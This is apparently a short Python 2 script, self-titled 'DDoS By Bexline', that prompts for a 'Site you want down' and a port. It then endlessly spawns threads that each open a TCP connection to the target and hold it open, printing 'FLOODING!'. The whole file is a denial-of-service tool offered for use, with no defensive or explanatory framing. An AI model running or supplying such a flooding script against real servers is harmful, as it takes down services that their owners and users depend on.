from os import *
from socket import *
from string import *
from random import *
from time import *
from thread import *

print "\a"
print \
"""
DDoS By Bexline
"""
print ("DDOS BY BEXLINE")

host = raw_input("Site you want down: ")
port = input("Port number: ")



def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sleep(99999)
        sock1.close
    except:
        print "The site is down"

n = 0


while 1:
    try:
        start_new_thread(connect, (n,))
    except:
        print "Connection Lost. Restart DOS"
    print "FLOODING!"
    sleep(0.1)
